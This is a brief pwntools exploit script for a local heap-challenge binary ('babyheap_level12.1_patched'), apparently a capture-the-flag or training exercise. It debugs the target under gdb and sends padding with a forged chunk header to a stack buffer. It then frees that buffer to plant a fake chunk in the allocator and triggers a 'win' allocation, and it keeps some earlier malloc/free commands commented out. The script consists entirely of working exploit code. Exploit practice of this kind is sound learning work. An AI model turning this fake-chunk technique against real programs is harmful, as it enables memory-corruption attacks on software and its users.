#!/usr/bin/env python3

from pwn import * 

binary = './babyheap_level12.1_patched'
p = process(binary)

s = '''
b malloc
b free
'''

gdb.attach(p, s)

context.log_level = 'debug'





# 0x6d 109
# stack scanf, scanf rbp-x90
p.sendline(b"stack_scanf " + b'B' * 0x30 + p64(0) + p64(0x51))



# free rbp-x90
p.sendline("stack_free")


p.sendline("stack_malloc_win")








'''
p.sendline("malloc 0 100")
p.sendline("malloc 1 100")


p.sendline("free 0")
p.sendline("free 1")
'''






p.interactive()



